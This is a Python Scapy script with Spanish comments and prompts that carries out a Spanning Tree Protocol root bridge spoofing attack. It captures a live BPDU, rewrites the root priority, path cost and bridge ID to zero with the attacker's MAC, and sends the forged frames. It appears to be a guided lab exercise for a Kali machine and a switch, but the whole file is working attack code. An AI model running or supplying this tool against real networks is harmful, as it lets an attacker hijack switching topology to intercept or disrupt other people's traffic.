#!/usr/bin/env python3
from scapy.all import *
import sys
import time
import re

SEPARATOR = "\n" + "=" * 70 + "\n"

# Utilidad para mostrar banners claros y centrados
def ascii_banner(text):
    framed = f"| {text} |"
    line = "=" * len(framed)
    print(f"\n{line}\n{framed}\n{line}")

# Introducción del script
def intro():
    ascii_banner("INICIO DEL ATAQUE SPANNING TREE")
    print("\n[1] Abre Wireshark y selecciona la interfaz 'swX-p5-kaliX'")
    print("[2] Observa los paquetes STP legítimos emitidos desde Kali")
    print("[3] Comprende su estructura antes de suplantar el root bridge")
    input("\n[ENTER] Continuar cuando Wireshark esté capturando...")

# Análisis y explicación de direcciones MAC del paquete STP
def explain_mac_addresses(pkt):
    print(SEPARATOR)
    print("[INFO] Análisis del paquete STP capturado")
    print("\nSe deben identificar dos MAC:")
    print("  (1) Kali (interfaz 'swX-p5-kali')\n  (2) Switch legítimo")
    print("\nPara obtenerlas:")
    print("  Kali: 'ip link show'\n  Switch: 'show system'")

    print("\nDatos del paquete:")
    print(f"  Origen     : {pkt.src}")
    print(f"  Destino    : {pkt.dst} (multicast STP 01:80:c2:00:00:00)")

    stp = pkt.getlayer(STP)
    print(f"  Root Bridge: {stp.rootmac}")

    print("\nEl campo Bridge ID se compone de:")
    print("  - 2 bytes: Prioridad (4 bits manual + 12 VLAN ID)")
    print("  - 6 bytes: MAC del bridge")
    print("\nValores comunes: 0x0000, 0x1000, ..., 0xF000")
    print("Ej: 0x2000 + VLAN 1 = 0x2001")
    print("Cuanto más bajo el valor, mayor prioridad")
    print(SEPARATOR)
    ascii_banner("RESUMEN BPDU CAPTURADO")

# Solicita y sugiere valores para campos STP
def prompt_or_suggest(field_name, current_val, suggested_val, bits_info, desc, reason):
    print(SEPARATOR)
    print(f"{field_name} ({bits_info})\n{desc}\nActual: 0x{current_val:04x}\nSugerido: 0x{suggested_val:04x} ({reason})")
    choice = input("\n¿Aceptar sugerido? [S/n]: ").strip().lower()
    if choice == 'n':
        while True:
            user_input = input("Nuevo valor (hex): ").strip()
            try:
                return int(user_input, 16)
            except ValueError:
                print("Valor no válido. Intente de nuevo.")
    return suggested_val

# Aplica modificaciones del paquete alterado a uno nuevo
def aplicar_modificaciones_base(pkt_base, pkt_modificado):
    if not (pkt_base.haslayer(STP) and pkt_modificado.haslayer(STP)):
        return pkt_base
    stp_base = pkt_base.getlayer(STP)
    stp_mod  = pkt_modificado.getlayer(STP)
    stp_base.rootid    = stp_mod.rootid
    stp_base.rootmac   = stp_mod.rootmac
    stp_base.pathcost  = stp_mod.pathcost
    stp_base.bridgeid  = stp_mod.bridgeid
    stp_base.bridgemac = stp_mod.bridgemac
    return pkt_base

# Validación de direcciones MAC
def is_valid_mac(mac):
    return re.fullmatch(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac) is not None

# Solicita valor hexadecimal dentro de rango
def prompt_hex_input(prompt_text, default_val):
    while True:
        user_input = input(prompt_text).strip()
        if user_input == '':
            return default_val
        try:
            val = int(user_input, 16)
            if 0x0000 <= val <= 0xFFFF:
                return val
            else:
                print("Valor fuera de rango (0x0000 - 0xFFFF).")
        except ValueError:
            print("Entrada no válida. Use número hexadecimal.")

# Modifica el contenido de la BPDU para el ataque STP
def modify_bpdu(pkt):
    if pkt.haslayer(Dot3) and pkt.haslayer(LLC) and pkt.haslayer(STP):
        stp = pkt.getlayer(STP)
        ascii_banner("PAQUETE BPDU CAPTURADO")
        explain_mac_addresses(pkt)
        stp.show()
        input("\nModificar BPDU... [ENTER]")

        stp.rootid = prompt_or_suggest(
            "ID del Root Bridge",
            stp.rootid,
            0x0000,
            "16 bits",
            "Prioridad del bridge (bajo = mayor prioridad)",
            "Valor más bajo posible"
        )

        suggested_mac = pkt.src
        print(SEPARATOR)
        print("MAC del Root Bridge")
        print(f"Actual:   {stp.rootmac}\nSugerido: {suggested_mac} (MAC atacante)")
        choice = input("\n¿Usar esta MAC? [S/n]: ").strip().lower()
        if choice == 'n':
            while True:
                new_mac = input("Nueva MAC (formato xx:xx:xx:xx:xx:xx): ").strip()
                if is_valid_mac(new_mac):
                    stp.rootmac = new_mac
                    break
                else:
                    print("Formato MAC inválido.")
        else:
            stp.rootmac = suggested_mac

        stp.pathcost = prompt_or_suggest(
            "Path Cost",
            stp.pathcost,
            0x0000,
            "16 bits",
            "Costo acumulado al root bridge",
            "0 = conexión directa"
        )

        stp.bridgeid = 0x0000
        stp.bridgemac = suggested_mac

        ascii_banner("BPDU MODIFICADO FINAL")
        stp.show()
        return pkt
    else:
        print("[ERROR] Paquete no contiene capa STP válida.")
        return None

# Funcíon principal del script
def main():
    intro()
    if len(sys.argv) != 2:
        print(f"\nUso: {sys.argv[0]} <interfaz>")
        sys.exit(1)

    iface = sys.argv[1]
    print(f"\nCapturando paquete STP en interfaz {iface}...")

    pkts = sniff(filter="ether dst 01:80:c2:00:00:00", iface=iface, count=1)
    pkt = pkts[0]

    modified_pkt = modify_bpdu(pkt.copy())

    if modified_pkt:
        input("\nEnviar BPDU modificada... [ENTER]")
        for _ in range(3):
            pkt_fresco = sniff(filter="ether dst 01:80:c2:00:00:00", iface=iface, count=1)[0]
            final_pkt = aplicar_modificaciones_base(pkt_fresco.copy(), modified_pkt)
            sendp(final_pkt, iface=iface, verbose=True)
            time.sleep(1)

        ascii_banner("ATAQUE STP ENVIADO")
        print("Revisa Wireshark. Ejecuta en el switch: 'show stp s0'")
        print("\nSi dejas de enviar BPDUs, el switch reelegirá un root válido.")
        print("STP se recupera si no detecta actividad del root anterior.")
        print("\nNOTA: Prioridades más altas (mayor número) serán ignoradas por STP.")
    else:
        print("No se envió ningún paquete.")

if __name__ == "__main__":
    main()

